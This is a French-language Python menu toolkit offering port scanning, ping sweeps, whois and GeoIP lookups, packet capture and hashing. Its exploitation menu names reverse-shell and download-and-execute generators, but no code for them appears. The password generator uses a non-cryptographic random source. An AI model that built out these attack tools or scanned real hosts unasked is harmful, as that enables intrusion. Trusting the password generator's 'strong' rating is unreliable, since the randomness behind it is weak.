#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import hashlib
import string
import random
import base64
import json
import shlex
import re
from pathlib import Path

class C:
    HEADER = ""
    BLUE = ""
    LIGHT_BLUE = ""
    CYAN = ""
    LIGHT_CYAN = ""
    GRAY = "\033[90m"
    GREEN = ""
    RED = ""
    MAGENTA = ""
    YELLOW = ""
    WHITE = "\033[97m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

TITLE = [
    C.WHITE + ":::::::-.    .:::. .,::::::   :::. :::::::::::: ::   .:  " + C.RESET,
    C.GRAY + " ;;,   `';, ,;'``;.;;;;''''   ;;`;;;;;;;';;,;;   ;;, " + C.RESET,
    C.GRAY + " `[[     [[ ''  ,[['[[cccc   ,[[ '[[,   [[    ,[[[,,,[[[ " + C.RESET,
    C.WHITE + '  $$,    $$ .c$$P\'  $$""""  c$$$cc$$$c  $$    "$$$"""$$$ ' + C.RESET,
    C.GRAY + ' 888_,o8P\'d88 _,oo,888oo,__ 888   888, 88,    888   "88o' + C.RESET,
    C.WHITE + '  MMMMP"`  MMMUP*"^^""""YUMMMYMM   ""`  MMM    MMM    YMM ' + C.RESET,
]

LOGO = [
    "                                    ⣀⣤⢴⣶⣄                                    ",
    "                                ⣀⣴⣿⢿⣿⣿⠟⠉⠻⢶⣤⣄⣀⣀⣀                                ",
    "                            ⣀⣴⣿⠿⣿⡟⠙⢡      ⠶⠛⣴⣾⢿⠙⣻⣽⣷⣦                            ",
    "                        ⣠⣾⣿⠿⣹⡴⣿⣿⣦⣾    ⣀      ⠾⡽⣷⣖                        ",
    "                    ⣰⡿⠋⠂⣿⣾⣿⣿⠁    ⠉⠻⣿⠿⣷⣿⣮                        ",
    "                ⣰⣿⠻⣄⠴⣷⠋⠉⣿          ⣠⡟     ⠉⠉                        ",
    "            ⣀⣼⣇⣠⣿⣿⣿⠁    ⣰⣿⣦⣄⣀⣠⣿                           ",
    "        ⣀⣠⣾⣏⣹⣿⣿       ⣰⣿⣿⣿⣿                              ",
    "    ⣴⣿⠿⠿     ⣤⣾⣿⣿                                    ",
    "    ⣰⣇⢰⣧     ⣿⣿⠟                                  ",
    "        ⠒⠻     ⣰⠟                                     ",
    "    ⣴⠁    ⣰⠟                                          ",
    "        ⠁                                             ",
]

def get_my_ip():
    try:
        return subprocess.check_output(["curl", "-s", "ifconfig.me"], timeout=5).decode().strip()
    except:
        return None

def get_my_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return socket.gethostbyname(socket.gethostname())

def get_input(prompt):
    return input(f"{C.WHITE}[?] {prompt}: {C.RESET}").strip()

def get_input_ip(prompt):
    print(f"{C.WHITE}[?] {prompt}: {C.RESET}")
    print(f"{C.GRAY}   [Entrée] = mon IP publique   |   Tapez l'IP manuellement{C.RESET}")
    choice = input(f"{C.WHITE}   └─>{C.RESET} ").strip()
    if not choice:
        my_ip = get_my_ip()
        if my_ip:
            print(f"{C.WHITE}[*] Utilisation de mon IP: {C.WHITE}{my_ip}{C.RESET}")
            return my_ip
        else:
            print(f"{C.GRAY}[!] Impossible de récupérer mon IP{C.RESET}")
            return None
    if not re.match(r'^[\d.]+$', choice):
        print(f"{C.GRAY}[!] Format IP invalide{C.RESET}")
        return None
    return choice

def get_input_domain(prompt):
    print(f"{C.WHITE}[?] {prompt}: {C.RESET}")
    print(f"{C.GRAY}   [Entrée] = mon IP publique   |   Tapez l'IP/Domaine{C.RESET}")
    choice = input(f"{C.WHITE}   └─>{C.RESET} ").strip()
    if not choice:
        my_ip = get_my_ip()
        if my_ip:
            print(f"{C.WHITE}[*] Utilisation de mon IP: {C.WHITE}{my_ip}{C.RESET}")
            return my_ip
        return None
    if not re.match(r'^[\w.\-]+$', choice):
        print(f"{C.GRAY}[!] Format domaine invalide{C.RESET}")
        return None
    return choice

CATEGORIES = {
    "1": {
        "name": "RECONNAISSANCE",
        "color": C.GRAY,
        "tools": [
            ("Scan de ports", "ports", "Scanner les ports ouverts"),
            ("Ping Scan", "ping", "Découverte des hôtes actifs"),
            ("DNS Lookup", "dns", "Résolution DNS"),
            ("Whois", "whois", "Informations WHOIS"),
            ("GeoIP", "geoip", "Localisation IP"),
            ("Traceroute", "traceroute", "Chemin vers une IP"),
        ]
    },
    "2": {
        "name": "RÉSEAU",
        "color": C.WHITE,
        "tools": [
            ("Mon IP", "myip", "Afficher mon IP publique"),
            ("IP Locale", "iplocale", "Afficher mon IP locale"),
            ("Toutes mes IPs", "allips", "Toutes mes interfaces"),
            ("Passerelle", "gateway", "Afficher gateway"),
            ("Vérifier Port", "checkport", "Vérifier si port ouvert"),
            ("Ping", "rawping", "Ping simple"),
            ("Calculatrice Réseau", "netcalc", "Calculer réseau/broadcast"),
            ("Netdiscover", "netdiscover", "Scanner le réseau local (ARP)"),
            ("Wireshark", "wireshark", "Lancer Wireshark (terminal)"),
        ]
    },
    "3": {
        "name": "CRYPTOGRAPHIE",
        "color": C.GRAY,
        "tools": [
            ("Générateur MDP", "password", "Générer un mot de passe"),
            ("Hash MD5", "md5", "Hash MD5"),
            ("Hash SHA256", "sha256", "Hash SHA256"),
            ("Hash Fichier", "filehash", "Hasher un fichier"),
            ("Base64 Encode", "b64e", "Encoder Base64"),
            ("Base64 Decode", "b64d", "Décoder Base64"),
            ("URL Encode", "urle", "Encoder URL"),
            ("URL Decode", "urld", "Décoder URL"),
        ]
    },
    "4": {
        "name": "SYSTÈME",
        "color": C.WHITE,
        "tools": [
            ("Info Système", "sysinfo", "Informations système"),
            ("Liste Fichiers", "lsdir", "Lister fichiers"),
        ]
    },
    "5": {
        "name": "EXPLOITATION",
        "color": C.GRAY,
        "tools": [
            ("Reverse Shell", "revshell", "Générer reverse shell"),
            ("Encoder Payload", "encpayload", "Encoder en Base64"),
            ("Décoder Payload", "decpayload", "Décoder Base64"),
            ("Serveur HTTP", "httpserver", "Démarrer serveur HTTP"),
            ("Download & Execute", "dllexec", "Download et execute"),
            ("Metasploit One-Liner", "msfgen", "Générer one-liner MSF"),
        ]
    },
    "6": {
        "name": "AUDIT",
        "color": C.GRAY,
        "tools": [
            ("Nmap", "nmap", "Scanner de ports avancé"),
            ("Masscan", "masscan", "Scan massif ultra-rapide"),
            ("Aircrack-ng", "aircrack", "Suite attaque WiFi"),
            ("Nikto", "nikto", "Scanner vulnérabilités web"),
            ("Hydra", "hydra", "Brute force login"),
            ("John the Ripper", "john", "Cracker mots de passe"),
            ("Hashcat", "hashcat", "Cracking GPU (hashcat)"),
            ("SQLMap", "sqlmap", "Détecter injections SQL"),
        ]
    },
}

TOOL_FUNCTIONS = {}

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def print_art():
    print()
    for line in TITLE:
        print(line)
    print()

def show_categories():
    print(f"{C.BOLD}   ┌─────────────────────────────────────────┐{C.RESET}")
    print(f"{C.BOLD}   │{C.RESET}         {C.WHITE}SÉLECTIONNER UNE CATÉGORIE{C.RESET}          {C.BOLD}│{C.RESET}")
    print(f"{C.BOLD}   └─────────────────────────────────────────┘{C.RESET}\n")
    
    for key, cat in CATEGORIES.items():
        print(f"   {C.BOLD}┌─[{C.WHITE} {key} {C.GRAY}]{C.RESET}  {cat['color']}▸ {cat['name']}{C.RESET}")
        print(f"   {C.GRAY}└{'─' * 45}╜{C.RESET}")
    
    print(f"\n   {C.BOLD}┌─[{C.WHITE} q {C.GRAY}]{C.RESET}  {C.WHITE}Quitter{C.RESET}")
    print(f"   {C.GRAY}└{'─' * 20}╜{C.RESET}\n")

def show_tools_in_category(cat_key):
    cat = CATEGORIES.get(cat_key)
    if not cat:
        return []
    
    clear()
    print()
    for line in TITLE:
        print(line)
    print()
    print(f"{C.BOLD}   ╔{'═' * 45}╗{C.RESET}")
    print(f"{C.BOLD}   ║{C.RESET}  {cat['color']}▸ {cat['name']}{C.RESET}")
    print(f"{C.BOLD}   ╚{'═' * 45}╝{C.RESET}\n")
    
    tools = cat["tools"]
    for i, (name, _, desc) in enumerate(tools, 1):
        print(f"   {C.BOLD}┌─{C.GRAY}[{C.WHITE}{i}{C.GRAY}]{C.RESET}  {C.WHITE}{name}{C.RESET}")
        print(f"   {C.GRAY}│   {desc}{C.RESET}")
        print(f"   {C.GRAY}└{'─' * 45}╜{C.RESET}\n")
    
    print(f"   {C.BOLD}┌─{C.GRAY}[{C.WHITE}0{C.GRAY}]{C.RESET}  {C.WHITE}← Retour{C.RESET}")
    print(f"   {C.GRAY}└{'─' * 20}╜{C.RESET}\n")
    return [t[1] for t in tools]

def pause():
    input(f"\n   {C.GRAY}Appuyez sur Entrée...{C.RESET}")

# ═══════════════════════════════════════════
# RECONNAISSANCE
# ═══════════════════════════════════════════

def tool_ports():
    clear()
    print(f"{C.GRAY}[*] Scan de ports{C.RESET}\n")
    
    target = get_input_ip("IP cible")
    if not target:
        pause()
        return
    
    try:
        start = int(get_input("Port début (défaut: 1)") or "1")
        end = int(get_input("Port fin (défaut: 1024)") or "1024")
    except ValueError:
        print(f"{C.GRAY}[!] Ports invalides{C.RESET}")
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Scan en cours sur {target}...{C.RESET}\n")
    open_ports = []
    
    for port in range(start, min(end + 1, 10000)):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        if sock.connect_ex((target, port)) == 0:
            open_ports.append(port)
            print(f"{C.WHITE}[+] Port {port} OUVERT{C.RESET}")
        sock.close()
    
    print(f"\n{C.WHITE}[*] {len(open_ports)} ports ouverts{C.RESET}" if open_ports else f"\n{C.GRAY}[!] Aucun port ouvert{C.RESET}")
    pause()

TOOL_FUNCTIONS["ports"] = tool_ports

def tool_ping():
    clear()
    print(f"{C.GRAY}[*] Ping Scan{C.RESET}\n")
    
    subnet = get_input("Plage IP (ex: 192.168.1)")
    if not subnet:
        print(f"{C.GRAY}[!] Plage invalide{C.RESET}")
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Scan en cours...{C.RESET}\n")
    param = "-n" if sys.platform == "win32" else "-c"
    
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        try:
            if subprocess.run(["ping", param, "1", "-W", "1", ip], 
                             capture_output=True, timeout=1).returncode == 0:
                print(f"{C.WHITE}[+] {ip} ACTIF{C.RESET}")
        except:
            pass
    
    pause()

TOOL_FUNCTIONS["ping"] = tool_ping

def tool_dns():
    clear()
    print(f"{C.GRAY}[*] DNS Lookup{C.RESET}\n")
    
    domain = get_input("Domaine")
    if not domain:
        print(f"{C.GRAY}[!] Domaine invalide{C.RESET}")
        pause()
        return
    
    try:
        ip = socket.gethostbyname(domain)
        print(f"\n{C.WHITE}[+] {C.WHITE}{domain}{C.WHITE} -> {C.WHITE}{ip}{C.RESET}")
        
        hostname, _, _ = socket.gethostbyaddr(ip)
        print(f"{C.WHITE}[+] Reverse: {C.WHITE}{hostname}{C.RESET}")
    except socket.gaierror:
        print(f"{C.GRAY}[!] Domaine introuvable{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["dns"] = tool_dns

def tool_whois():
    clear()
    print(f"{C.GRAY}[*] Whois{C.RESET}\n")
    
    target = get_input_ip("IP ou Domaine")
    if not target:
        print(f"{C.GRAY}[!] Cible invalide{C.RESET}")
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Recherche WHOIS sur {target}...{C.RESET}\n")
    
    try:
        result = subprocess.run(["whois", shlex.quote(target)], capture_output=True, text=True, timeout=10)
        if result.stdout:
            print(f"{C.WHITE}{result.stdout[:3000]}{C.RESET}")
        else:
            print(f"{C.GRAY}[!] Pas d'informations disponibles{C.RESET}")
    except FileNotFoundError:
        print(f"{C.GRAY}[!] Whois non installé (apt install whois){C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["whois"] = tool_whois

def tool_geoip():
    clear()
    print(f"{C.GRAY}[*] GeoIP Lookup{C.RESET}\n")
    
    target = get_input_ip("Adresse IP")
    if not target:
        print(f"{C.GRAY}[!] IP invalide{C.RESET}")
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Localisation de {target}...{C.RESET}\n")
    
    try:
        result = subprocess.run(["curl", "-s", f"ipinfo.io/{target}/json"], 
                               capture_output=True, text=True, timeout=5)
        data = json.loads(result.stdout)
        
        if "bogon" in data:
            print(f"{C.WHITE}[!] IP privée/bogon (non traçable){C.RESET}")
        else:
            print(f"{C.WHITE}[+] IP: {C.WHITE}{data.get('ip', target)}{C.RESET}")
            print(f"{C.WHITE}[+] Hostname: {C.WHITE}{data.get('hostname', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Ville: {C.WHITE}{data.get('city', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Région: {C.WHITE}{data.get('region', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Pays: {C.WHITE}{data.get('country', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Localisation: {C.WHITE}{data.get('loc', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Timezone: {C.WHITE}{data.get('timezone', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] ASN: {C.WHITE}{data.get('org', 'N/A')}{C.RESET}")
            
            if "loc" in data and data["loc"] and "," in data["loc"]:
                lat, lon = data["loc"].split(",", 1)
                print(f"\n{C.GRAY}   Maps: https://www.google.com/maps?q={lat},{lon}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["geoip"] = tool_geoip

def tool_traceroute():
    clear()
    print(f"{C.GRAY}[*] Traceroute{C.RESET}\n")
    
    target = get_input_domain("IP ou Domaine")
    if not target:
        print(f"{C.GRAY}[!] Cible invalide{C.RESET}")
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Traceroute vers {target}...{C.RESET}\n")
    
    try:
        param = "tracert" if sys.platform == "win32" else "traceroute"
        result = subprocess.run([param, shlex.quote(target)], capture_output=True, text=True, timeout=30)
        print(f"{C.WHITE}{result.stdout[:2000]}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["traceroute"] = tool_traceroute

# ═══════════════════════════════════════════
# RÉSEAU
# ═══════════════════════════════════════════

def tool_myip():
    clear()
    print(f"{C.WHITE}[*] Mon IP Publique{C.RESET}\n")
    
    my_ip = get_my_ip()
    if not my_ip:
        print(f"{C.GRAY}[!] Impossible de récupérer mon IP{C.RESET}")
        pause()
        return
    
    print(f"{C.WHITE}[+] IP Publique: {C.WHITE}{my_ip}{C.RESET}\n")
    
    try:
        result = subprocess.run(["curl", "-s", f"ipinfo.io/{my_ip}/json"], 
                               capture_output=True, text=True, timeout=5)
        data = json.loads(result.stdout)
        
        if data.get("ip"):
            print(f"{C.WHITE}[+] Ville: {C.WHITE}{data.get('city', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Région: {C.WHITE}{data.get('region', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Pays: {C.WHITE}{data.get('country', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] ISP: {C.WHITE}{data.get('org', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Timezone: {C.WHITE}{data.get('timezone', 'N/A')}{C.RESET}")
    except:
        pass
    
    pause()

TOOL_FUNCTIONS["myip"] = tool_myip

def tool_iplocale():
    clear()
    print(f"{C.WHITE}[*] Mon IP Locale{C.RESET}\n")
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        print(f"{C.WHITE}[+] Hôte: {C.WHITE}{hostname}{C.RESET}")
        print(f"{C.WHITE}[+] IP Locale: {C.WHITE}{local_ip}{C.RESET}")
        
        my_local = get_my_local_ip()
        if my_local != local_ip:
            print(f"{C.WHITE}[+] IP (iface): {C.WHITE}{my_local}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["iplocale"] = tool_iplocale

def tool_allips():
    clear()
    print(f"{C.WHITE}[*] Toutes mes IPs{C.RESET}\n")
    
    hostname = socket.gethostname()
    print(f"{C.WHITE}[+] Hôte: {C.WHITE}{hostname}{C.RESET}\n")
    
    try:
        result = subprocess.check_output(["ip", "addr"], text=True)
        for line in result.split("\n"):
            line = line.strip()
            if line.startswith("inet "):
                parts = line.split()
                print(f"{C.WHITE}[+] {C.WHITE}{parts[2]}{C.GRAY} ({parts[1]}){C.RESET}")
    except:
        try:
            result = subprocess.check_output(["ifconfig"], text=True)
            for line in result.split("\n"):
                if "inet " in line and not line.strip().startswith("inet6"):
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if p == "inet":
                            print(f"{C.WHITE}[+] {C.WHITE}{parts[i+1]}{C.RESET}")
        except:
            print(f"{C.GRAY}[!] Commandes réseau non disponibles{C.RESET}")
    
    print()
    public = get_my_ip()
    if public:
        print(f"{C.WHITE}[+] IP Publique: {C.WHITE}{public}{C.RESET}")
    else:
        print(f"{C.GRAY}[i] IP publique non disponible{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["allips"] = tool_allips

def tool_gateway():
    clear()
    print(f"{C.WHITE}[*] Passerelle (Gateway){C.RESET}\n")
    
    try:
        result = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        parts = result.split()
        if len(parts) >= 3:
            gw = parts[2]
            print(f"{C.WHITE}[+] Passerelle: {C.WHITE}{gw}{C.RESET}")
            
            try:
                hostname = socket.gethostbyaddr(gw)[0]
                print(f"{C.GRAY}    DNS inverse: {C.WHITE}{hostname}{C.RESET}")
            except:
                pass
        else:
            raise ValueError("Format inattendu")
    except:
        try:
            result = subprocess.check_output(["route", "-n"], text=True)
            for line in result.split("\n"):
                if "UG" in line:
                    parts = line.split()
                    print(f"{C.WHITE}[+] Passerelle: {C.WHITE}{parts[1]}{C.GRAY} (iface: {parts[-1]}){C.RESET}")
        except:
            print(f"{C.GRAY}[!] Impossible de récupérer la passerelle{C.RESET}")
    
    print()
    print(f"{C.GRAY}[*] Test de connectivité:{C.RESET}")
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "1", "8.8.8.8"], capture_output=True)
        if result.returncode == 0:
            print(f"{C.WHITE}[+] Connexion internet: OK{C.RESET}")
        else:
            print(f"{C.GRAY}[!] Connexion internet: ÉCHEC{C.RESET}")
    except:
        print(f"{C.GRAY}[!] Test impossible{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["gateway"] = tool_gateway

def tool_checkport():
    clear()
    print(f"{C.WHITE}[*] Vérifier port{C.RESET}\n")
    
    target = get_input_ip("IP cible")
    if not target:
        print(f"{C.GRAY}[!] IP invalide{C.RESET}")
        pause()
        return
    
    try:
        port = int(get_input("Port"))
    except ValueError:
        print(f"{C.GRAY}[!] Port invalide{C.RESET}")
        pause()
        return
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    
    if sock.connect_ex((target, port)) == 0:
        print(f"\n{C.WHITE}[+] Port {port} sur {target} est OUVERT{C.RESET}")
    else:
        print(f"\n{C.GRAY}[!] Port {port} sur {target} est FERMÉ{C.RESET}")
    
    sock.close()
    pause()

TOOL_FUNCTIONS["checkport"] = tool_checkport

def tool_rawping():
    clear()
    print(f"{C.WHITE}[*] Ping{C.RESET}\n")
    
    target = get_input_domain("IP ou Domaine")
    if not target:
        print(f"{C.GRAY}[!] Cible invalide{C.RESET}")
        pause()
        return
    
    try:
        param = "-n" if sys.platform == "win32" else "-c"
        count = get_input("Nombre de paquets (défaut: 4)") or "4"
        subprocess.run(["ping", param, count, target], timeout=30)
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["rawping"] = tool_rawping

def tool_netcalc():
    clear()
    print(f"{C.WHITE}[*] Calculatrice réseau{C.RESET}\n")
    
    try:
        ip = get_input("Adresse IP (ex: 192.168.1.1)")
        cidr = get_input("CIDR (ex: 24)") or "24"
        
        ip_parts = [int(x) for x in ip.split(".")]
        ip_int = (ip_parts[0] << 24) + (ip_parts[1] << 16) + (ip_parts[2] << 8) + ip_parts[3]
        
        mask_int = (0xFFFFFFFF << (32 - int(cidr))) & 0xFFFFFFFF
        network = ip_int & mask_int
        broadcast = network | (~mask_int & 0xFFFFFFFF)
        
        def itoa(i):
            return f"{(i >> 24) & 255}.{(i >> 16) & 255}.{(i >> 8) & 255}.{i & 255}"
        
        print(f"\n{C.WHITE}[+] Réseau:     {C.WHITE}{itoa(network)}/{cidr}{C.RESET}")
        print(f"{C.WHITE}[+] Broadcast:   {C.WHITE}{itoa(broadcast)}{C.RESET}")
        print(f"{C.WHITE}[+] Masque:      {C.WHITE}{itoa(mask_int)}{C.RESET}")
        print(f"{C.WHITE}[+] Première IP: {C.WHITE}{itoa(network + 1)}{C.RESET}")
        print(f"{C.WHITE}[+] Dernière IP: {C.WHITE}{itoa(broadcast - 1)}{C.RESET}")
        print(f"{C.WHITE}[+] Nombre IPs:  {C.WHITE}{2**(32-int(cidr))}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["netcalc"] = tool_netcalc

def tool_netdiscover():
    clear()
    print(f"{C.WHITE}[*] Netdiscover{C.RESET}\n")
    
    print(f"{C.GRAY}[*] Vérification de netdiscover...{C.RESET}\n")
    
    result = subprocess.run(["which", "netdiscover"], capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"{C.WHITE}[+] Netdiscover installé{C.RESET}\n")
        
        iface = get_input("Interface réseau (défaut: eth0)") or "eth0"
        
        print(f"\n{C.GRAY}[*] Scan ARP en cours sur {iface}...{C.RESET}")
        print(f"{C.GRAY}[*] Ctrl+C pour arrêter{C.RESET}\n")
        
        try:
            subprocess.run(["netdiscover", "-i", iface, "-r", "0.0.0.0/24"], timeout=60)
        except KeyboardInterrupt:
            print(f"\n{C.WHITE}[!] Scan arrêté{C.RESET}")
        except Exception as e:
            print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    else:
        print(f"{C.GRAY}[!] Netdiscover non installé{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Voulez-vous l'installer ? (o/n): {C.RESET}").strip().lower()
        
        if install == "o":
            print(f"\n{C.GRAY}[*] Installation de netdiscover...{C.RESET}\n")
            try:
                if os.path.exists("/etc/debian_version"):
                    subprocess.run(["sudo", "apt", "update"], check=True)
                    subprocess.run(["sudo", "apt", "install", "-y", "netdiscover"], check=True)
                elif os.path.exists("/etc/arch-release"):
                    subprocess.run(["sudo", "pacman", "-S", "--noconfirm", "netdiscover"], check=True)
                elif os.path.exists("/etc/fedora-release"):
                    subprocess.run(["sudo", "dnf", "install", "-y", "netdiscover"], check=True)
                else:
                    print(f"{C.WHITE}[!] Distribution non reconnue, installez manuellement{C.RESET}")
                    print(f"{C.GRAY}    Ubuntu/Debian: sudo apt install netdiscover{C.RESET}")
                    print(f"{C.GRAY}    Arch: sudo pacman -S netdiscover{C.RESET}")
                    print(f"{C.GRAY}    Fedora: sudo dnf install netdiscover{C.RESET}")
                
                print(f"\n{C.WHITE}[+] Installation terminée{C.RESET}")
                print(f"{C.GRAY}[*] Relancez l'outil pour l'utiliser{C.RESET}")
            except Exception as e:
                print(f"{C.GRAY}[!] Erreur d'installation: {e}{C.RESET}")
        else:
            print(f"\n{C.GRAY}[*] Commandes d'installation manuelle:{C.RESET}")
            print(f"{C.WHITE}    sudo apt install netdiscover{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["netdiscover"] = tool_netdiscover

def tool_wireshark():
    clear()
    print(f"{C.WHITE}[*] Wireshark{C.RESET}\n")
    
    print(f"{C.GRAY}[*] Vérification de Wireshark...{C.RESET}\n")
    
    result = subprocess.run(["which", "wireshark"], capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"{C.WHITE}[+] Wireshark installé{C.RESET}")
        print(f"{C.WHITE}[*] Lancement de Wireshark en terminal...{C.RESET}")
        print(f"{C.GRAY}[*] Interface: TShark (version terminal de Wireshark){C.RESET}\n")
        
        iface = get_input("Interface réseau (défaut: eth0)") or "eth0"
        
        try:
            subprocess.run(["tshark", "-i", iface, "-c", "100"], timeout=30)
        except KeyboardInterrupt:
            print(f"\n{C.WHITE}[!] Capture arrêtée{C.RESET}")
        except FileNotFoundError:
            print(f"{C.GRAY}[!] TShark non trouvé, utilisation de tcpdump{C.RESET}")
            print(f"{C.GRAY}[*] Capture avec tcpdump... (Ctrl+C pour arrêter){C.RESET}\n")
            try:
                subprocess.run(["tcpdump", "-i", iface, "-c", "50"])
            except KeyboardInterrupt:
                print(f"\n{C.WHITE}[!] Capture arrêtée{C.RESET}")
            except FileNotFoundError:
                print(f"{C.GRAY}[!] tcpdump non installé{C.RESET}")
    else:
        print(f"{C.GRAY}[!] Wireshark non installé{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Voulez-vous l'installer ? (o/n): {C.RESET}").strip().lower()
        
        if install == "o":
            print(f"\n{C.GRAY}[*] Installation de Wireshark...{C.RESET}\n")
            try:
                if os.path.exists("/etc/debian_version"):
                    subprocess.run(["sudo", "apt", "update"], check=True)
                    subprocess.run(["sudo", "apt", "install", "-y", "wireshark", "tshark", "tcpdump"], check=True)
                elif os.path.exists("/etc/arch-release"):
                    subprocess.run(["sudo", "pacman", "-S", "--noconfirm", "wireshark-cli", "tcpdump"], check=True)
                elif os.path.exists("/etc/fedora-release"):
                    subprocess.run(["sudo", "dnf", "install", "-y", "wireshark-cli", "tcpdump"], check=True)
                else:
                    print(f"{C.WHITE}[!] Distribution non reconnue, installez manuellement{C.RESET}")
                    print(f"{C.GRAY}    Ubuntu/Debian: sudo apt install wireshark tshark tcpdump{C.RESET}")
                    print(f"{C.GRAY}    Arch: sudo pacman -S wireshark-cli tcpdump{C.RESET}")
                    print(f"{C.GRAY}    Fedora: sudo dnf install wireshark-cli tcpdump{C.RESET}")
                
                print(f"\n{C.WHITE}[+] Installation terminée{C.RESET}")
            except Exception as e:
                print(f"{C.GRAY}[!] Erreur d'installation: {e}{C.RESET}")
        else:
            print(f"\n{C.GRAY}[*] Commandes d'installation manuelle:{C.RESET}")
            print(f"{C.WHITE}    sudo apt install wireshark tshark tcpdump{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["wireshark"] = tool_wireshark

# ═══════════════════════════════════════════
# CRYPTOGRAPHIE
# ═══════════════════════════════════════════

def tool_password():
    clear()
    print(f"{C.GRAY}[*] Générateur de mot de passe{C.RESET}\n")
    
    try:
        length = int(get_input("Longueur (défaut: 16)") or "16")
    except ValueError:
        print(f"{C.GRAY}[!] Longueur invalide{C.RESET}")
        pause()
        return
    
    use_special = get_input("Caractères spéciaux ? (o/n)").lower() == "o"
    
    chars = string.ascii_letters + string.digits
    if use_special:
        chars += string.punctuation
    
    password = ''.join(random.choice(chars) for _ in range(length))
    
    print(f"\n{C.WHITE}[+] Mot de passe: {C.WHITE}{password}{C.RESET}")
    
    strength = "Faible"
    if length >= 12:
        strength = "Moyen"
    if length >= 16 and use_special:
        strength = "Fort"
    if length >= 20 and use_special:
        strength = "Très fort"
    
    print(f"{C.GRAY}[*] Force: {strength}{C.RESET}")
    pause()

TOOL_FUNCTIONS["password"] = tool_password

def tool_md5():
    clear()
    print(f"{C.GRAY}[*] Hash MD5{C.RESET}\n")
    
    text = get_input("Texte à hasher")
    if not text:
        print(f"{C.GRAY}[!] Texte invalide{C.RESET}")
        pause()
        return
    
    hash_md5 = hashlib.md5(text.encode()).hexdigest()
    print(f"\n{C.WHITE}[+] MD5: {C.WHITE}{hash_md5}{C.RESET}")
    pause()

TOOL_FUNCTIONS["md5"] = tool_md5

def tool_sha256():
    clear()
    print(f"{C.GRAY}[*] Hash SHA256{C.RESET}\n")
    
    text = get_input("Texte à hasher")
    if not text:
        print(f"{C.GRAY}[!] Texte invalide{C.RESET}")
        pause()
        return
    
    hash_sha256 = hashlib.sha256(text.encode()).hexdigest()
    print(f"\n{C.WHITE}[+] SHA256: {C.WHITE}{hash_sha256}{C.RESET}")
    pause()

TOOL_FUNCTIONS["sha256"] = tool_sha256

def tool_filehash():
    clear()
    print(f"{C.GRAY}[*] Hash de fichier{C.RESET}\n")
    
    filepath = get_input("Chemin du fichier")
    if not filepath or not os.path.exists(filepath):
        print(f"{C.GRAY}[!] Fichier introuvable{C.RESET}")
        pause()
        return
    
    try:
        md5 = hashlib.md5()
        sha256 = hashlib.sha256()
        
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                md5.update(chunk)
                sha256.update(chunk)
        
        print(f"\n{C.WHITE}[+] Fichier: {C.WHITE}{filepath}{C.RESET}")
        print(f"{C.GRAY}    MD5:    {C.WHITE}{md5.hexdigest()}{C.RESET}")
        print(f"{C.GRAY}    SHA256: {C.WHITE}{sha256.hexdigest()}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["filehash"] = tool_filehash

def tool_b64e():
    clear()
    print(f"{C.GRAY}[*] Base64 Encode{C.RESET}\n")
    
    text = get_input("Texte à encoder")
    if not text:
        print(f"{C.GRAY}[!] Texte invalide{C.RESET}")
        pause()
        return
    
    encoded = base64.b64encode(text.encode()).decode()
    print(f"\n{C.WHITE}[+] Encodé: {C.WHITE}{encoded}{C.RESET}")
    pause()

TOOL_FUNCTIONS["b64e"] = tool_b64e

